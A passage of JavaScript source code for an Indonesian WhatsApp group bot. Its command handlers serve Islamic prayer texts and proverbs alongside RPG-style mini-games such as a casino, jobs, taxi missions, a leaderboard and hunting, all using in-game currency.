"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh” atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT"
/`.trim()
    replygcxeon(`${caption}`)
}
break
//=========================================\\
case 'niatsholat': {
    if (!q) return replygcxeon(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return replygcxeon(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    replygcxeon(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    replygcxeon(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replygcxeon(`${caption}`)
}
break
//=========================================\\
case 'nebang': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

    return hours + " jam " + minutes + " menit " + seconds + " detik"
}
	  let user = global.db.users[m.sender]
    let time = user.lastparming + 1800000
    if (new Date - user.lastparming < 1800000) return replygcxeon(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
	let wood = `${Math.floor(Math.random() * 50)}`.trim()
	let money = `${Math.floor(Math.random() * 50000)}`.trim()
	user.wood += wood * 1
	user.money += money * 1
	user.lastparming = new Date * 1
    replygcxeon(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break
//=========================================\\
case 'casino': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
let buatall = 1
    XeonBotInc.casino = XeonBotInc.casino ? XeonBotInc.casino : {}
    if (m.chat in XeonBotInc.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
    else XeonBotInc.casino[m.chat] = true
    try {
        let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
        let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
        let Aku = (randomaku * 1)
        let Kamu = (randomkamu * 1)
        let count = args[0]
        count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
        count = Math.max(1, count)
        if (args.length < 1) return reply('casino <jumlah>\n ' + 'casino 1000', )
        if (global.db.users[m.sender].exp >= count * 1) {
            global.db.users[m.sender].exp -= count * 1
            //await reply('') //Kwkwwkkwlwlw
            if (Aku > Kamu) {
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nKamu kehilangan ${count} Uang(xp)`)
            } else if (Aku < Kamu) {
                global.db.users[m.sender].exp += count * 2
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nKamu mendapatkan ${count * 2} Uang(xp)`)
            } else {
                global.db.users[m.sender].exp += count * 1
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*SERI*\nKamu mendapatkan ${count * 1} Uang(xp)`)
            }
        } else reply(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
    } catch (e) {
        console.log(e)
        reply('Error!!')
        if (DevMode) {
            for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != XeonBotInc.user.jid)) {
                XeonBotInc.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
            }
        }
    } finally {
        delete XeonBotInc.casino[m.chat]
    }
}
break
//=========================================\\
case 'kerja':
case 'bekerja': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let type = (args[0] || '').toLowerCase()
    let users = global.db.users[m.sender]
    let time = users.lastkerja + 30000
    let __timers = (new Date - users.lastkerja)
    let _timers = (1000 - __timers)
    let timers = clockString(_timers)

    let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

    let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
    let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
    
    let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
    let pasien = pasie[Math.floor(Math.random() * pasie.length)]

    let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
    let panen = pane[Math.floor(Math.random() * pane.length)]

    let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
    let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

    let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
    let rumah = ruma[Math.floor(Math.random() * ruma.length)]

    if (/kerja/i.test(command)) {
        switch (type) {
            case 'ojek':
if (new Date - users.lastkerja < 300000) return replygcxeon(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
	              users.lastparming = new Date * 1
replygcxeon(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ${global.rpg.emoticon('money')}*`)
break
            case 'pedagang':
if (new Date - users.lastkerja < 300000) return replygcxeon(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
	              users.lastparming = new Date * 1
replygcxeon(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ${global.rpg.emoticon('money')}*`)
break
            case 'dokter':
if (new Date - users.lastkerja < 300000) return replygcxeon(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
	              users.lastparming = new Date * 1
replygcxeon(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ${global.rpg.emoticon('money')}`)
break
            case 'petani':
if (new Date - users.lastkerja < 300000) return replygcxeon(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
	              users.lastparming = new Date * 1
replygcxeon(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ${global.rpg.emoticon('money')}*`)
break
            case 'montir':
if (new Date - users.lastkerja < 300000) return replygcxeon(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
	              users.lastparming = new Date * 1
replygcxeon(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ${global.rpg.emoticon('money')}`)
break
            case 'kuli':
if (new Date - users.lastkerja < 300000) return replygcxeon(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
	              users.lastparming = new Date * 1
replygcxeon(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
            default:
return replygcxeon(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
        }
    }
}
break
//=========================================\\
  case 'bankcek': {
    if (!m.isGroup) return reply(mess.only.group)
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? XeonBotInc.user.jid: m.sender
    if (!(who in global.db.users)) return m.reply(`User ${who} not in database`)
    let user = global.db.users[who]
    let isMods = global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let isOwner = m.fromMe || isMods || [XeonBotInc.decodeJid(XeonBotInc.user.id), ...global.owner.filter(([number, _, isOwner]) => number && !isOwner).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let isPrems =  isOwner || new Date() - user.premiumTime < 0
    let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: XeonBotInc.getName(m.sender)}
│ ${global.rpg.emoticon('atm')} Atm: ${user.atm > 0 ? 'Level ' + user.atm: '✖️'}
│ ${global.rpg.emoticon('bank')} Bank: ${user.bank} / ${user.fullatm}
│ ${global.rpg.emoticon('money')} Money: ${user.money}
│ ${global.rpg.emoticon('chip')} Chip: ${user.chip}
│ 🤖 Robo: ${user.robo > 0 ? 'Level ' + user.robo: '✖️'}
│ 🌟 Status: ${isMods ? 'Developer' : isOwner ? 'Owner' : isPrem ? 'Premium User ✅' : user.level > 999 ? 'Elite User' : 'Free User'}
│ 📑 Registered: ${user.registered ? 'Yes': 'No'}
└────···
`.trim()
    replygcxeon(`${caption}`)
}
break
//=========================================\\
case 'bansos': {
  if (!m.isGroup) return reply(mess.only.group)
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function clockString(ms) {
    let h = Math.floor(ms / 3600000);
    let m = Math.floor(ms / 60000) % 60;
    let s = Math.floor(ms / 1000) % 60;
    return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
  }

  let user = global.db.users[m.sender];
  let randomaku = Math.floor(Math.random() * 101);
  let randomkamu = Math.floor(Math.random() * 101);
  let __timers = new Date() - user.lastbansos;
  let _timers = 360 - __timers;
  let timers = clockString(_timers);

  if (user.money < 1000) {
    return replygcxeon(`Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`);
  }

  if (new Date() - user.lastbansos > 300000) {
    if (randomaku > randomkamu) {
      user.money -= 3000000;
      user.lastbansos = new Date() * 1;
      return XeonBotInc.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/afcf9a7f4e713591080b5.jpg' },
        caption: `Kamu Tertangkap Setelah Kamu korupsi dana bansos🕴️💰,  Dan Kamu harus membayar denda 3 Juta rupiah💵`
      });
    } else if (randomaku < randomkamu) {
      user.money += 3000000;
      user.lastbansos = new Date() * 1;
      return XeonBotInc.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg' },
        caption: `Kamu berhasil korupsi dana bansos🕴️💰,  Dan Kamu mendapatkan 3 Juta rupiah💵`
      });
    } else {
      user.lastbansos = new Date() * 1;
      return replygcxeon(`Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`);
    }
  } else {
    return replygcxeon(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
  }
}
break;

//=========================================\\
case 'taxy': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = XeonBotInc.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Taxy'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi : {}
    if (id in XeonBotInc.misi) {
        replygcxeon(`Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - user.lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 1000000)
        let randomaku2 = Math.floor(Math.random() * 10000)
        
        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🚕


✔️ Mendapatkan orderan....
`.trim()

        var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳  🌳 🏘️  🏘️🏡


🚖 Mengantar Ke tujuan.....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳  🌳 🏘️


🚖 Selesai Mengantar Pelanggan....
`.trim()

        var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

        var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 💹 Uang = [ ${randomaku1} ]
➕ ✨ Exp = [ ${randomaku2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

        user.money += randomaku1
        user.exp += randomaku2
        user.ojekk += 1
        
        XeonBotInc.misi[id] = [
            kerja,
        setTimeout(() => {
            delete XeonBotInc.misi[id]
        }, 27000)
        ]
        
        setTimeout(() => {
            replygcxeon(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replygcxeon(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replygcxeon(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replygcxeon(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replygcxeon(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replygcxeon('🔍Mencari pelanggan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replygcxeon(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=========================================\\
//=========================================\\
case 'leaderboard': {
  if (!m.isGroup) return reply(mess.only.group)
const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
const { areJidsSameUser } = require ('@whiskeysockets/baileys')
function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
  if (!number) return number
  number = parseInt(number)
  return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
    'level',
    'exp',
    'limit',
    'money',
    'iron',
    'gold',
    'diamond',
    'emerald',
    'trash',
    'joinlimit',
    'potion',
    'petFood',
    'wood',
    'rock',
    'string',
    'common',
    'uncommon',
    'mythic',
    'legendary',
    'pet',
    'bank',
    'chip',
    'skata'
]
    let users = Object.entries(global.db.users).map(([key, value]) => {
        return {
            ...value, jid: key
        }
    })
    let imgr = getRandom()
    let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
    let type = (args[0] || '').toLowerCase()
    const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
    let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
    if (!leaderboard.includes(type))
        return await reply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
        contextInfo: {
            
        }
    })
    let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
    let sortedItem = users.map(toNumber(type)).sort(sort(type))
    let userItem = sortedItem.map(enumGetKey)
    // let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
    let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

                *• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: XeonBotInc.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
    return await reply(text,{
        contextInfo: {
            mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
           
        }
    })
}
break
//=========================================\\
case 'mulung': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds
    return hours + " jam " + minutes + " menit " + seconds + " detik"
}
    let user = global.db.users[m.sender]
    let time = user.lastmulung + 1800000

    if (new Date - user.lastmulung < 1800000) return replygcxeon(`Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(time - new Date())} lagi`)

    let botol = Math.floor(Math.random() * 1000)
    let kaleng = Math.floor(Math.random() * 1000)
    let kardus = Math.floor(Math.random() * 1000)
    let gelas = Math.floor(Math.random() * 1000)
    let plastik = Math.floor(Math.random() * 1000)

    user.botol += botol * 1
    user.kaleng += kaleng * 1
    user.kardus += kardus * 1
    user.gelas += gelas * 1
    user.plastik += plastik * 1
    user.lastmulung = new Date * 1

    replygcxeon(`Selamat kamu mendapatkan : \n+${botol} Botol\n+${kaleng} Kaleng\n+${kardus} Kardus\n+${gelas} Gelas\n+${plastik} Plastik`)
}
break
//=========================================\\
case 'berburu': {
  if (!m.isGroup) return reply(mess.only.group)
    function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = XeonBotInc.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Berburu'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi : {}
    if (id in XeonBotInc.misi) {
        return replygcxeon( `Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
     }
    if (new Date - user.lastmisi > 3600000) {
		let hewan1 = Math.floor(Math.random() * 10)
		let hewan2 = Math.floor(Math.random() * 10)
		let hewan3 = Math.floor(Math.random() * 10)
		let hewan4 = Math.floor(Math.random() * 10)
		let hewan5 = Math.floor(Math.random() * 10)
		let hewan6 = Math.floor(Math.random() * 10)
		let hewan7 = Math.floor(Math.random() * 10)
		let hewan8 = Math.floor(Math.random() * 10)
		let hewan9 = Math.floor(Math.random() * 10)
		let hewan10 = Math.floor(Math.random() * 10)
		let hewan11 = Math.floor(Math.random() * 10)
		let hewan12 = Math.floor(Math.random() * 10)
		
		let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : XeonBotInc.getName(m.sender)}* 
${hewan1 ? `
🐂 Banteng: ${hewan1}` : ''} ${hewan2 ? `
🐅 Harimau: ${hewan2}` : ''} ${hewan3 ? `
